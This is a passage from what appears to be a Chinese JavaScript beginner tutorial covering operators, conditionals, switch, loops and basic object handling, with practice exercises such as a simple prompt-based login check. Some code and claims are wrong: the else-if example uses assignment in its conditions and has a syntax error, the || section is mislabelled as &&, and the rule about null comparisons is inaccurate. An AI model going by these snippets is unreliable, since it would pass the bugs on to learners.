align="center">作用</th></tr></thead><tbody><tr><td align="center">+（加）</td><td align="center">加法</td></tr><tr><td align="center">-（减）</td><td align="center">减法</td></tr><tr><td align="center">*（乘）</td><td align="center">乘法</td></tr><tr><td align="center">/（除）</td><td align="center">除法</td></tr><tr><td align="center">%（求余）</td><td align="center">求余数</td></tr></tbody></table><p>总结： <code>就加法（+）特殊点：与字符串进行运算连接，全部转为字符串（String）</code></p><hr><h1 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h1><ul><li>加号（+）<ul><li>加在数据类型的前面可转成Number类型</li></ul></li><li>减号（-）<ul><li>减在数据类型的前面可取反，和数学一样</li></ul></li></ul><hr><h1 id="自增和自减"><a href="#自增和自减" class="headerlink" title="自增和自减"></a>自增和自减</h1><table><thead><tr><th align="center">表达式</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">++x</td><td align="center">先自增，再把值给别人或运算</td></tr><tr><td align="center">x++</td><td align="center">先把原来的值给别人或者运算后，再自增</td></tr><tr><td align="center">--x</td><td align="center">先自减，再把值给别人或运算</td></tr><tr><td align="center">x--</td><td align="center">先把原来的值给别人或者运算后，再自减</td></tr></tbody></table><hr><h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><table><thead><tr><th align="center">符号</th><th align="center">逻辑</th></tr></thead><tbody><tr><td align="center">&amp;&amp;</td><td align="center">与</td></tr><tr><td align="center">||</td><td align="center">或</td></tr><tr><td align="center">！</td><td align="center">非</td></tr></tbody></table><ul><li><strong>逻辑运算符真值表</strong></li></ul><table><thead><tr><th align="center">a</th><th align="center">b</th><th align="center">a&amp;&amp;b</th><th align="center">a||b</th><th align="center">!a</th></tr></thead><tbody><tr><td align="center">false</td><td align="center">false</td><td align="center">false</td><td align="center">false</td><td align="center">true</td></tr><tr><td align="center">false</td><td align="center">true</td><td align="center">false</td><td align="center">true</td><td align="center">true</td></tr><tr><td align="center">true</td><td align="center">false</td><td align="center">false</td><td align="center">true</td><td align="center">false</td></tr><tr><td align="center">true</td><td align="center">true</td><td align="center">true</td><td align="center">true</td><td align="center">false</td></tr></tbody></table><h2 id="amp-amp-（与）"><a href="#amp-amp-（与）" class="headerlink" title="&amp;&amp;（与）"></a>&amp;&amp;（与）</h2><ul><li><p>&amp;&amp; 与运算符</p><ul><li>在传统的编程中，只有两个操作数都是真值时，与运算返回true，否则返回false</li><li>有一个false 则返回 false<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>( <span class="literal">true</span> &amp;&amp; <span class="literal">true</span>);<span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="literal">true</span> &amp;&amp; <span class="literal">false</span>);<span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="literal">false</span> &amp;&amp; <span class="literal">true</span>);<span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="literal">false</span> &amp;&amp; <span class="literal">false</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><code>如果操作数不是布尔值的情况下，会先转成布尔值，在运算</code></li></ul></li><li><p>&amp;&amp; 与运算寻找第一个假值</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = value1 &amp;&amp; value2 &amp;&amp; value3;</span><br></pre></td></tr></table></figure><ul><li>与运算**&amp;&amp;**做了以下的事： <ul><li>从左往右依次计算操作数 </li><li>在处理每个操作数时，都将其转化为布尔值，如果结果是<strong>false</strong>，就停止计算，并返回<strong>这个操作数的初始值</strong></li><li>如果说操作数都被计算过（如果都是真值），则返回<strong>最后一个操作数</strong></li><li>换句话说，就是<ul><li>如果是<strong>假值</strong>，就停止运算，并返回这个<strong>假值的初始值</strong>，</li><li>如果是<strong>真值</strong>，就返回最后的那个<strong>真值的初始值</strong></li></ul></li></ul></li></ul></li><li><p>&amp;&amp; 运算(返回假值)：</p><ul><li>如果第一个值为<code>true</code>,则必然返回<code>第二个值</code></li><li>如果第一个值为<code>false</code>，则直接返回<code>第一个值</code></li></ul></li></ul><h2 id="（或）"><a href="#（或）" class="headerlink" title="||（或）"></a>||（或）</h2><ul><li><p>&amp;&amp; 与运算符</p><ul><li>在传统的编程中，有一个 true 则返回 true，否则返回 false</li><li>有一个true 则返回 true<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>( <span class="literal">true</span> || <span class="literal">true</span>);<span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="literal">true</span> || <span class="literal">false</span>);<span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="literal">false</span> || <span class="literal">true</span>);<span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="literal">false</span> || <span class="literal">false</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><code>如果操作数不是布尔值的情况下，会先转成布尔值，在运算</code></li></ul></li><li><p>或运算寻找第一个真值</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = value1 || value2 || value3;</span><br></pre></td></tr></table></figure><ul><li>与运算**||**做了以下的事： <ul><li>从左往右依次计算操作数</li><li>在处理每个操作数时，都将其转化为布尔值，如果结果是<strong>true</strong>，就停止计算，并返回<strong>这个操作数的初始值</strong></li><li>如果说操作数都被计算过（如果都是false），则返回<strong>最后一个操作数</strong></li><li>换句话说，就是<ul><li>如果是<strong>真值</strong>，就停止运算，并返回这个<strong>真值的初始值</strong>，</li><li>如果是<strong>假值</strong>，就返回最后的那个<strong>假值的初始值</strong></li></ul></li></ul></li></ul></li><li><p>||或运算（返回真值）：</p><ul><li>如果第一个值<code>true</code>，则返回<code>第一个值</code></li><li>如果第一个值为<code>false</code>,则返回<code>第二个值</code></li></ul></li></ul><h2 id="！（非）"><a href="#！（非）" class="headerlink" title="！（非）"></a>！（非）</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">result = !value;</span><br></pre></td></tr></table></figure><ul><li><strong>逻辑非运算符接受一个参数，并按如下运作：</strong><ul><li>将操作数转化为<strong>布尔类型：true/false</strong>。</li><li>返回<strong>相反的值</strong></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>( !<span class="literal">true</span> ); <span class="comment">// false</span></span><br><span class="line"><span class="title function_">alert</span>( !<span class="number">0</span> ); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="登录页面小练习"><a href="#登录页面小练习" class="headerlink" title="登录页面小练习"></a>登录页面小练习</h2><p>实现使用 <code>prompt</code> 进行登陆校验的代码。<br>如果访问者输入<code> &quot;Admin&quot;</code>，那么使用 <code>prompt</code> 引导获取密码，如果输入的用户名为空或者按下了 Esc 键 —— 显示 “Canceled”，如果是其他字符串 —— 显示 “I don’t know you”。</p><p>密码的校验规则如下： </p><ul><li>如果输入的是 “TheMaster”，显示 “Welcome!”，</li><li>其他字符串 —— 显示 “Wrong password”，</li><li>空字符串或取消了输入，显示 “Canceled.”。</li></ul><p>流程图：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">&quot;use strict&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> userNume = <span class="title function_">prompt</span>(<span class="string">&quot;Who&#x27;s there?&quot;</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (userNume === <span class="string">&#x27;Admin&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> pass = <span class="title function_">prompt</span>(<span class="string">&#x27;Password&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (pass === <span class="string">&#x27;TheMaster&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&#x27;Welcome&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pass === <span class="string">&#x27;&#x27;</span> || pass === <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&#x27;Canceled&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&#x27;Wrong password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (userNume === <span class="string">&#x27;&#x27;</span> || userNume === <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&#x27;canceled&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&#x27;other&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h1><table><thead><tr><th align="center">运算符</th><th align="center">用法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">a &gt; b</td><td align="center">如果成立，结果为 true，否则为 false</td></tr><tr><td align="center">&gt;=</td><td align="center">a &gt;= b</td><td align="center">如果成立，结果为 true，否则为 false</td></tr><tr><td align="center">&lt;</td><td align="center">a &lt; b</td><td align="center">如果成立，结果为 true，否则为 false</td></tr><tr><td align="center">&lt;=</td><td align="center">a &lt;= b</td><td align="center">如果成立，结果为 true，否则为 false</td></tr><tr><td align="center">==</td><td align="center">a == b</td><td align="center">如果成立，结果为 true，否则为 false</td></tr><tr><td align="center">!=</td><td align="center">a != b</td><td align="center">如果成立，结果为 true，否则为 false</td></tr></tbody></table><p>对非数值的比较运算，会先把非数值先转为数字，在做比较<br>任何值和null比较都得false<br>如果两边都是字符串，则用两边的unicode编码进行比较（一位一位按顺序比较）</p><hr><h1 id="相等运算符"><a href="#相等运算符" class="headerlink" title="相等运算符"></a>相等运算符</h1><table><thead><tr><th align="center">运算符</th><th align="center">解释</th><th align="center">区别</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">相等</td><td align="center">先转成同类型，再比较</td></tr><tr><td align="center">===</td><td align="center">全等</td><td align="center">不转类型，直接比较，不同类型直接先false</td></tr></tbody></table><hr><h1 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h1><p>条件运算符也叫<code>三元运算符</code><br>语法：<code>条件表达式？语法1:语法2；</code><br>条件表达式在执行时，首先对条件表达式进行求值<br>如果值为<code>true</code>,则执行<code>语句1</code>，并<code>返回结果</code><br>如果值为<code>false</code>，则执行<code>语句2</code>，并<code>返回结果</code></p><hr><h1 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h1><p>if(….) 语句计算括号里的表达式，如果计算结果是<code>true</code>, 就会执行对应的代码块<br>如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;判断为真时执行&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="else-语句"><a href="#else-语句" class="headerlink" title="else 语句"></a>else 语句</h2><p>如果条件不成立时，执行的语句</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>)&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;不执行&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&#x27;执行的语句&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="else-if-语句"><a href="#else-if-语句" class="headerlink" title="else if 语句"></a>else if 语句</h2><p>如果有<code>多个条件</code> 则可以使用<code>else if</code><br>如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">if</span>(a=<span class="number">1</span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;a=&#x27;</span><span class="number">1</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a=<span class="number">2</span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;a=&#x27;</span><span class="number">2</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a=<span class="number">3</span>)&#123;</span><br><span class="line">   <span class="title function_">alert</span>(<span class="string">&#x27;a=&#x27;</span><span class="number">3</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h2><p>从键盘输入小明的期末成绩：<br>当成绩为100时，‘奖励一辆BMW’<br>当成绩为[80-99]时,’奖励一台iphone15s’<br>当成绩为[60-80]时，’奖励一本参考书’<br>其他时，什么奖励也没有</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &quot;use strict&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> score = <span class="title function_">prompt</span>(<span class="string">&quot;小明的期末成绩&quot;</span>, <span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (score == <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;奖励一辆BMW&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span> &amp;&amp; score &lt;= <span class="number">99</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;奖励一台iphone15s&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">80</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;奖励一本参考书&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;什么奖励也没有&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h2><p>大家都知道，男大当婚，女大当嫁。那么女方家长要嫁女儿，当然要提出一定的条件：<br>高：180cm以上；富：1000万以上；帅：500以上；<br>如果这三个条件同时满足，则：’我一定要嫁给他’<br>如果三个条件有为真的情况，则：’嫁吧，比上不足，比下有余。’<br>如果三个条件都不满足，则：’不嫁！’</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &quot;use strict&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> height = <span class="title function_">prompt</span>(<span class="string">&quot;你的身高长度(cm)&quot;</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> money = <span class="title function_">prompt</span>(<span class="string">&quot;你的有钱程度(w)&quot;</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> cool = <span class="title function_">prompt</span>(<span class="string">&quot;你的帅气程度(分)&quot;</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (height &gt; <span class="number">180</span> &amp;&amp; money &gt; <span class="number">1000</span> &amp;&amp; cool &gt; <span class="number">500</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;我一定要嫁给他&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (height &gt; <span class="number">180</span> || money &gt; <span class="number">1000</span> || cool &gt; <span class="number">500</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;嫁把，比上不足比下有余&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;不嫁&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h1><p><code>switch</code> 语句有<code>至少</code>一个 <code>case</code> 代码块和一个<code>可选</code>的 <code>default</code> 代码块。<br>语法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (a) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="title function_">alert</span>( <span class="string">&#x27;Too small&#x27;</span> );</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="title function_">alert</span>( <span class="string">&#x27;Exactly!&#x27;</span> );</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="title function_">alert</span>( <span class="string">&#x27;Too large&#x27;</span> );</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="attr">default</span>:</span><br><span class="line">    <span class="title function_">alert</span>( <span class="string">&quot;I don&#x27;t know such values&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>比较<code>x</code>值与第一个<code>case</code>（也就是 <code>value1</code>）是否严格相等，然后比较第二个 <code>case</code>（<code>value2</code>）以此类推。</li><li>如果相等，<code>switch</code> 语句就执行相应 <code>case</code> 下的代码块，直到遇到最靠近的 <code>break</code> 语句（或者直到 <code>switch</code> 语句末尾）。</li><li>如果没有符合的 <code>case</code>，则执行 <code>default</code> 代码块（如果 <code>default</code> 存在）。</li></ul><hr><h1 id="while"><a href="#while" class="headerlink" title="while"></a>while</h1><p><code>while</code> 循环的语法如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">3</span>) &#123; <span class="comment">// 依次显示 0、1 和 2</span></span><br><span class="line">  <span class="title function_">alert</span>( i );</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h2><p>使用 <code>do..while</code> 语法可以将<code>条件检查移至循环体下面</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="title function_">alert</span>( i ); <span class="comment">// 依次显示 0、1 和 2</span></span><br><span class="line">  i++;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt; <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>相比无<code>do</code>的while <code>至少会执行一次</code>，当i &lt; 0 时，会输出0</p><hr><h1 id="for"><a href="#for" class="headerlink" title="for"></a>for</h1><p><code>for</code> 循环看起来就像这样：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (begin; condition; step) &#123;</span><br><span class="line">  <span class="comment">// ……循环体……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123; <span class="comment">// 结果为 0、1、2</span></span><br><span class="line">  <span class="title function_">alert</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>新声明了一个初始值i，表达式为i&lt;3，执行循环体，每次循环后运行i++</code></p><hr><h1 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &quot;use strict&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">writeln</span>(i); <span class="comment">// 输出 1、2、 3、4、5</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p><strong>跳出离最近的循环体</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &quot;use strict&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">writeln</span>(i); <span class="comment">//输出 1</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h2><p><strong>跳出本次循环</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &quot;use strict&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">continue</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">writeln</span>(i); <span class="comment">// 输出 1、3、4、5</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="对象-Object"><a href="#对象-Object" class="headerlink" title="对象 Object"></a>对象 Object</h1><p>对象属于一种复合属性的类型，在对象中可以保存多个不同的数据类型的属性</p><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ul><li><p>内建对象</p><ul><li>由ES标准中定义的对象，在如何的ES的实现中都可以使用</li><li>如：<code>Math String Number Boolean Function Object</code></li></ul></li><li><p>宿主对象</p><ul><li>由JS的运行环境提供的对象，目前来将主要指由浏览器提供的对象</li><li>比如 BOM DOM</li></ul></li><li><p>自建对象</p><ul><li>由开发人员直接创建</li></ul></li></ul><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><ul><li>创建对象<ul><li>使用<code>new</code>关键字调用的函数，是构造函数<code>constructor</code></li><li><code>构造函数</code>是专门用来<code>创建对象的函数</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> obj);<span class="comment">// Object</span></span><br></pre></td></tr></table></figure></li></ul></li><li>向对象添加属性<ul><li>在对象中的值称为属性</li><li>语法：<code>对象</code>.<code>属性名</code> = <code>属性值</code>； <code>对象</code>[<code>属性名</code>] = <code>属性值</code>;<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.<span class="property">name</span> = <span class="string">&quot;a dian&quot;</span>;</span><br><span class="line">obj.<span class="property">age</span> = <span class="number">20</span>;</span><br><span class="line">obj[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;男&#x27;</span></span><br></pre></td></tr></table></figure></li></ul></li><li>读取对象中的属性<ul><li>语法：<code>对象</code>.<code>属性名</code>; <code>对象</code>[<code>属性名</code>];</li><li><code>注意</code>：读取未定义的属性，不会报错，而是返回 <code>undefined</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>);<span class="comment">//a dian</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">age</span>);<span class="comment">//20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">sex</span>);<span class="comment">//男</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">hello</span>);    <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></li></ul></li><li>修改对象的属性值<ul><li>语法：<code>对象</code>.<code>属性名</code> = <code>新属性值</code>；<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.<span class="property">name</span> = <span class="string">&quot;chen a dian&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li>删除对象的属性<ul><li>语法：<code>delete</code> <code>对象</code>.<code>属性名</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> obj.<span class="property">name</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>);<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="属性名与属性值"><a href="#属性名与属性值" class="headerlink" title="属性名与属性值"></a>属性名与属性值</h2><ul><li>属性名<br>对象的属性名<code>不强制</code> 要求遵守<code>标识符的规范</code><br>但最好还是用<code>规范命名</code><br>特殊命名：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj<span class="number">.123</span> = <span class="number">123</span>;           <span class="comment">//报错</span></span><br><span class="line">obj[<span class="string">&quot;123&quot;</span>] = <span class="number">123</span>;        <span class="comment">//正确</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj<span class="number">.123</span>);    <span class="comment">//报错 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj[<span class="string">&quot;123&quot;</span>]); <span class="comment">//正确</span></span><br></pre></td></tr></table></figure></li><li>属性值<br>属性值可以是任意的数据类型：<br><code>number string null undefined boolean</code> 也可以是对象 <code>object</code><br><code>in</code> 运算符 <code>检查属性</code>是否 在指定的对象中 <code>有则true</code>,<code>无则false</code><br>语法： <code>“属性名” in 对象</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">obj.<span class="property">name</span> = <span class="string">&quot;我是名字&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name&quot;</span> <span class="keyword">in</span> obj);</span><br></pre></td></tr></table></figure></li></ul><h2 id="枚举对象中的属性"><a href="#枚举对象中的属性" class="headerlink" title="枚举对象中的属性"></a>枚举对象中的属性</h2><p>当不知道对象中有什么属性时<br>可以用 <code>for…in</code> 来输出对象的各个<code>属性</code><br>语法：<code>for(var 变量 in 对象)&#123; console.log(n); &#125;</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;</span><br><span class="line"> <span class="attr">name</span>:<span class="string">&quot;chenadian&quot;</span>,</span><br><span class="line"> <span class="attr">age</span>:<span class="number">18</span>,</span><br><span class="line"> <span 